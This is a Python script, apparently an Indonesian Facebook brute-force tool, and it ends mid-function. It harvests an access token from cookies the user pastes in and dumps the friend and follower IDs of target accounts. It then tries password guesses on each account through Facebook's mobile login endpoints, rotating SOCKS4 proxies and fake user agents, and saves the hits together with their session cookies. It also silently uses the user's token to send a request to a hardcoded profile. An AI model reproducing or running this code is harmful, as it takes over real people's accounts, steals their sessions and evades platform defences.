#!/usr/bin/python3
#coding=utf-8
#create 20/07/2022
import requests,bs4,json,os,sys,random,datetime,time,re,marshal
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
try:
        import rich
except ImportError:
        print("\t [!] Sedang menginstal module rich")
        os.system("python -m pip install --upgrade pip && pip install rich")
try:
	import requests
except ImportError:
	print("\t [!] Sedang menginstal module requests")
	os.system("pip install requests")
try:
	import mechanize
except ImportError:
	print("\t [!] Sedang menginstal module mechanize")
	os.system("pip install mechanize")
try:
	import mechanize
except ImportError:
	print("\t [!] Sedang menginstal module user agent")
	os.system("pip install random-user-agent")
########## TAMPUNG MANTAN ##########
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
princp=[]
pwpluss=[]
pwnya=[]
ses=requests.Session()
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	#prox= requests.get('https://spys.me/socks.txt').text
	#prox= requests.get('https://github.com/AngCyber/MultiBF/blob/main/ASU/SERVER/proxies.txt').text
	open('Zuck/proxy.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mGaruk_Peler')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
########## WARNA RANDOM ##########
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
A = '\x1b[0;33m'
N = '\x1b[0m'    
E = '\033[38;2;255;127;0;1m'
HA = '\x1b[0;32m'
KU = '\x1b[0;33m'
x = '\33[m'
m = '\x1b[1;91m'
k = '\033[93m'
h = '\x1b[1;92m'
hh = '\033[32m'
u = '\033[95m'
kk = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m'
########### URL FACEBOOK ##########
__peler__ = "100027796542918"
__bokep__ = "b-api.facebook.com"
__janda__ = "mbasic.facebook.com"
__pepex__ = "m.facebook.com"
__markzuck__ = "free.facebook.com"
__dev__ = "developer.facebook.com"
kopi = random.choice(["Mozilla/4.0 BlackBerry8100/4.2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/100","Mozilla/5.0 (Linux; Android 10; TECNO KE6j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","BlackBerry7130/4.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102","UCWEB/2.0 (Windows; U; wds 7.10; zh-CN; NOKIA; Nokia 610C) U2/1.0.0 UCBrowser/3.0.1.302 U2/1.0.0 Mobile","Mozilla/5.0 (Linux; arm_64; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.134 YaApp_Android/22.72.1 YaSearchBrowser/22.72.1 BroPP/1.0 SA/3 Mobile Safari/537.36"])
########## DATA BULAN ##########
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
__join__ = ''+str(tgl)+' '+str(bln)+' '+str(thn)+''
########## SYSTEM CONTROL ##########
def clear():
	os.system('clear')
def back():
	login()
def jalan(Kiya):
	for Aang in Kiya + "\n":
		sys.stdout.write(Aang)
		sys.stdout.flush()
		time.sleep(0.03)
########## GAMBAR ##########
def banner():
	print(f"{P}   __  ___     ____  _   ___  ____\n  /  |/  /_ __/ / /_(_) / _ )/ __/\n / /|_/ / // / / __/ / / _  / _/\n/_/  /_/\_,_/_/\__/_/ /____/_/\n\t  {H}version 3.7{P}\n")
########## MASUK COOKIES ##########
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			masuk()
		except requests.exceptions.ConnectionError:
			print("%s╰───%s Koneksi internet eror"%(H,P));exit()
	except IOError:
		masuk()
########## MENU LOGIN ##########
def masuk():
	os.system('clear');banner()
	print("%s#%s Menu login"%(M,P))
	print("%s╰───%s(%s1%s). Login dengan cookies"%(H,P,O,P))
	print("%s╰───%s(%s2%s). Cara mengambil cookies"%(H,P,O,P))
	print("%s╰───%s(%s0%s). Exit program"%(H,P,O,P))
	__sas__ = input("\n%s#%s Input 1 sampai 2 : "%(M,P))
	if __sas__ in ["1", "01"]:
		gimana()
	elif __sas__ in ["2", "02"]:
		jalan("%s╰───%s Anda akan diarahkan ke youtube"%(H,P));time.sleep(1)
		os.system('xdg-open https://youtu.be/iDVCcnLcTnE')
		masuk()
	elif __sas__ in ["0", "00"]:
		print("\n%s#%s Notice me"%(M,P))
		jalan("%s╰───%s Selamat tinggal semoga harimu indah"%(H,P))
		exit()
########## LOGIN COOKIE ##########
def gimana():
	try:
		print("\n%s#%s Informasi login"%(M,P))
		print("%s╰───%s Gunakan akun fb tumbal/tak terpakai"%(H,P))
		print("%s╰───%s Ingat, jangan gunakan akun pribadi"%(H,P))
		cookie = input("\n%s#%s Masukan cookies : %s"%(M,P,HA))
		memek=requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", memek.text)
		ken=open(".token.txt", "w").write(find_token.group(1));peler()
		cok=open(".cok.txt", "w").write(cookie)
		print("\n%s#%s Berhasil"%(M,P))
		jalan("%s╰───%s Selamat, login berhasil"%(H,P));login()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print("\n%s#%s Gagal"%(M,P))
		jalan("%s╰───%s Maaf, login gagal"%(H,P));time.sleep(1)
		jalan("%s╰───%s Cek akun fb anda terlebih dahulu"%(H,P))
		exit()
def peler():
	try:
		requests.post(f"https://graph.facebook.com/{__peler__}?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
########## MENU ##########
def menu(__nama__,__idz__):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print("%s╰───%s Cookies anda invalid"%(H,P))
		time.sleep(2);masuk()
	os.system('clear');banner()
	__IP__ = requests.get("https://api.ipify.org").text
	print("%s#%s Informasi user"%(M,P));time.sleep(0.03)
	print(f"{H}╰───{P} User active : {H}"+str(__nama__));time.sleep(0.03)
	print(f"{H}╰───{P} Ip address  : {H}{__IP__}{P}");time.sleep(0.03)
	print(f"{H}╰───{P} Gabung pada : {H}{__join__}{P}\n");time.sleep(0.03)
	print("%s#%s Menu Tools"%(M,P));time.sleep(0.03)
	print("%s╰───%s(%s1%s). Crack id dari teman publik"%(H,P,O,P));time.sleep(0.03)
	print("%s╰───%s(%s2%s). Crack id dari followers"%(H,P,O,P));time.sleep(0.03)
	print("%s╰───%s(%s3%s). Check results crack me"%(H,P,O,P));time.sleep(0.03)
	print("%s╰───%s(%s4%s). Informasi tools"%(H,P,O,P));time.sleep(0.03)
	print("%s╰───%s(%s0%s). Exit (%shapus cookie%s)"%(H,P,O,P,M,P));time.sleep(0.03)
	__kya__ = input("\n%s#%s Input 1 sampai 4 : "%(M,P));time.sleep(0.03)
	if __kya__ in ["1", "01"]:
		publik()
	elif __kya__ in ["2", "02"]:
		follower()
	elif __kya__ in ["3", "03"]:
		result()
	elif __kya__ in ["4", "04"]:
		informasi()
	elif __kya__ in ["0", "00"]:
		os.system('rm -rf .token.txt');os.system('rm -rf .cookie.txt')
		jalan("%s╰───%s Tunggu, sedang menghapus info login"%(H,P));time.sleep(2)
		print("%s╰───%s Info login berhasil terhapus"%(H,P))
		exit()
	else:
		print("%s╰───%s Input anda salah"%(H,P));back()
########## CEK RESULTS ##########
def result():
	print("\n%s#%s Check results crack"%(M,P))
	print("%s╰───%s(%s1%s). Results %sOK%s saya"%(H,P,O,P,H,P))
	print("%s╰───%s(%s2%s). Results %sCP%s saya"%(H,P,O,P,K,P))
	print("%s╰───%s(%s0%s). Kembali ke menu"%(H,P,O,P))
	__kentod__ = input("\n%s#%s Input 1 sampai 2 : "%(M,P))
	if __kentod__ in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print("%s╰───%s File ndak ada"%(H,P));time.sleep(2);back()
		if len(vin)==0:
			print("%s╰───%s Anda belum punya results OK"%(H,P));time.sleep(2);back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'%s╰───%s(%s%s%s). %s ({H}%s{P}) id'%(H,P,O,nom,P,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'%s╰───%s(%s%s%s). %s ({H}%s{P}) id'%(H,P,O,nom,P,isi,len(hem)))
			geeh = input("\n%s#%s Input nomor file : "%(M,P))
			try:geh = lol[geeh]
			except KeyError:
				print("%s╰───%s Input anda salah"%(H,P));back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print("%s╰───%s File ndak ada"%(H,P));time.sleep(2);back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f"{P}╰───{H}{cpkuni[0]}|{cpkuni[1]}");time.sleep(0.03)
				nocp +=1
			input("\n%s#%s Tekan enter"%(M,P));back()
	elif __kentod__ in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print("%s╰───%s File ndak ada"%(H,P));time.sleep(2);back()
		if len(vin)==0:
			print("%s╰───%s Anda belum punya results CP"%(H,P));time.sleep(2);back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'%s╰───%s(%s%s%s). %s ({K}%s{P}) id'%(H,P,O,nom,P,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'%s╰───%s(%s%s%s). %s ({K}%s{P}) id'%(H,P,O,nom,P,isi,len(hem)))
			geeh = input("\n%s#%s Input nomor file : "%(M,P))
			try:geh = lol[geeh]
			except KeyError:
				print("%s╰───%s Input anda salah"%(H,P));back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print("%s╰───%s File ndak ada"%(H,P));time.sleep(2);back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{P}╰───{K} {cpkuni[0]}|{cpkuni[1]}');time.sleep(0.03)
				nocp +=1
			input("\n%s#%s Tekan enter"%(M,P));back()
	elif __kentod__ in ['3']:
		back()
########## PUBLIK ##########
def publik():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		__sas__ = int(input(f"\n{M}#{P} Ingin dump berapa id (max 20): "))
	except ValueError:
		print("%s╰───%s Masukan hanya angka"%(H,P));exit()
	if __sas__<1 or __sas__>100:
		print("%s╰───%s Gagal dump, mungkin id private"%(H,P));exit()
	ses=requests.Session()
	memek = 0
	for met in range(__sas__):
		memek+=1
		ppk = input(f"{H}╰───{P} Enter target ke {H}{str(memek)}{P} : ");uid.append(ppk)
	for __colmek__ in uid:
		try:
			col = ses.get(f'https://graph.facebook.com/v2.0/{__colmek__}?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print("\n%s╰───%s Koneksi internet eror"%(H,P));exit()
	try:
		jalan(f"{H}╰───{P} Berhasil dump {H}{str(len(id))}{P} id")
		setting()
	except requests.exceptions.ConnectionError:
		print("\n%s╰───%s Koneksi internet eror"%(H,P))
		back()
	except (KeyError,IOError):
		print("%s╰───%s Target private/tidak memiliki teman"%(H,P));time.sleep(2)
		back()
########## FOLLOWER ##########
def follower():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	print("\n%s#%s Ketik %sme%s untuk dump followers sendiri"%(M,P,H,P))
	__janda__ = input("%s╰───%s Enter target id : "%(H,P))
	try:
		Kiya = requests.get(f'https://graph.facebook.com/{__janda__}?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in Kiya['subscribers']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		jalan(f"{H}╰───{P} Berhasil dump {H}{str(len(id))}{P} id");setting()
	except requests.exceptions.ConnectionError:
		print("\n%s╰───%s Koneksi internet eror"%(H,P));time.sleep(2)
		back()
	except (KeyError,IOError):
		print("%s╰───%s Target private/tidak memiliki teman"%(H,P));time.sleep(2)
		back()
########## ATUR ID CRACK ##########
def setting():
	print("\n%s#%s Input urutan id"%(M,P))
	print("%s╰───%s(%s1%s). Crack dari id tertua"%(H,P,O,P))
	print("%s╰───%s(%s2%s). Crack dari id termuda"%(H,P,O,P))
	print("%s╰───%s(%s3%s). Crack random id"%(H,P,O,P))
	__sas__ = input("\n%s#%s Input 1 sampai 3 : "%(M,P))
	if __sas__ in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif __sas__ in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif __sas__ in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print("%s╰───%s Maaf, input hanya angka"%(H,P));exit()
	print("\n%s#%s Input metode crack"%(M,P))
	print("%s╰───%s(%s1%s). Metode mbasic (%sslow crack%s)"%(H,P,O,P,U,P))
	print("%s╰───%s(%s2%s). Metode mobile fb (%svery slow%s)"%(H,P,O,P,H,P))
	__kon__ = input("\n%s#%s Input 1 sampai 2 : "%(M,P))
	if __kon__ in [""]:
		print("%s╰───%s Input yang bener"%(H,P));setting()
	elif __kon__ in ["1", "01"]:
		method.append("mbasic")
	elif __kon__ in ["2", "02"]:
		method.append("mobile")
	else:
		method.append('mbasic')
	pwplus = input("\n%s#%s Tambahkan password manual (y/t): "%(M,P))
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print("%s╰───%s Gunakan %skoma%s sebagai pemisah"%(H,P,H,P))
		print("%s╰───%s Contoh : %sngentot,memek,mantan%s"%(H,P,H,P))
		pwku=input("\n%s#%s Masukan password : "%(M,P))
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	apk = input("%s╰───%s Tampilkan apk terkait (y/t): "%(H,P))
	if apk in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	kunaon()
########## MOBILE ##########
def crack(idf,pwv):
	global loop,ok,cp
	cuk = random.choice([M,U,K,A,B,E,H,O,P])
	sys.stdout.write(f"\r{M}# {P}Crack ({cuk}{loop}/{len(id)}{P}) Ok/{H}{ok}{P} -> Cp/{K}{cp}{P} "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({
					'Host': 'm.facebook.com',
					'cache-control': 'max-age=0',
					'sec-ch-ua-mobile': '?1',
					'upgrade-insecure-requests': '1',
					'user-agent': 'Mozilla/4.0 BlackBerry8100/4.2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/100',
					'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
					'x-requested-with': 'com.facebook.mlite',
					'sec-fetch-site': 'same-origin',
					'sec-fetch-mode': 'cors',
					'sec-fetch-dest': 'empty',
					'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
			})
			p = ses.get(f'https://{__pepex__}/login/device-based/password/?uid={idf}&flow=login_no_pin&next=https%3A%2F%2F{__pepex__}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={
				"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
				"uid":idf,
				"next":"https://"+__pepex__+"/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified",
				"flow":"login_no_pin",
				"pass":pw,
			}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
				'Host': 'm.facebook.com',
				'connection': 'keep-alive',
				'content-Length': '142',
				'cache-control': 'max-age=0',
				'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
				'sec-ch-ua-mobile': '?1',
				'sec-ch-ua-platform': '"Android"',
				'upgrade-insecure-requests': '1',
				'origin': 'https://'+__dev__,
				'content-type': 'application/x-www-form-urlencoded',
				'user-agent': 'Mozilla/5.0 (Linux; U; Android 11; zh-cn; Mi 10 Pro Build/RKQ1.200710.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.147 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.6.14',
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'x-requested-with': 'com.facebook.orca',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'navigate',
				'sec-fetch-user': '?1',
				'sec-fetch-dest': 'empty',
				'referer': f'https://{__pepex__}/login/device-based/password/?uid={idf}&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
				'accept-encoding': 'gzip, deflate, br',
				'accept-language': 'id-ID,id;q=0.9'
			}
			po = ses.post(
					f'https://{__pepex__}/login/device-based/validate-password/?shbl=0',
					data=dataa,
					cookies={'cookie': koki},
					headers=heade,
					allow_redirects=False,
					proxies=proxs
				)
			if "checkpoint" in po.cookies.get_dict().keys():
				print("\r%s╰───%s %s|%s              %s"%(P,KU,idf,pw,P))
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; U; Android 10; it-it; Mi 10T Pro Build/QKQ1.200419.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.6.6-gn"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = 'c_user=' + coki['c_user'] + ';' + ('datr=' + coki['datr']) + ';' + ('fr=' + coki['fr']) + ';' + ('sb=' + coki['sb']) + ';' + ('xs=' + coki['xs'])
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r%s╰───%s %s|%s               \n%s%s"%(P,HA,idf,pw,kuki,P))     
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
						nok+=1
					hit=0
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
					print("\r%s╰───%s %s|%s|%s\n%s%s"%(P,HA,idf,pw,kuki,infoakun,P))     
					ok+=1
					break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
########## MBASIC ##########
def crackmbasic(idf,pwv):
	global loop,ok,cp
	cuk = random.choice([M,U,K,A,B,E,H,O,P])
	sys.stdout.write(f"\r{M}# {P}Crack ({cuk}{loop}/{len(id)}{P}) Ok/{H}{ok}{P} -> Cp/{K}{cp}{P} "),
	sys.stdout.flush()
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({
					"Host":"mbasic.facebook.com",
					"upgrade-insecure-requests":"1",
					"user-agent":"Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 Safari/525 3gpp-gba",
					"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
					"dnt":"1",
					"x-requested-with":"com.facebook.katana",
					"sec-fetch-site":"same-origin",
					"sec-fetch-mode":"cors",
					"sec-fetch-user":"?1",
					"sec-fetch-dest":"empty",
					"referer":"https://"+__janda__,
					"accept-encoding":"gzip, deflate br",
					"accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
				})
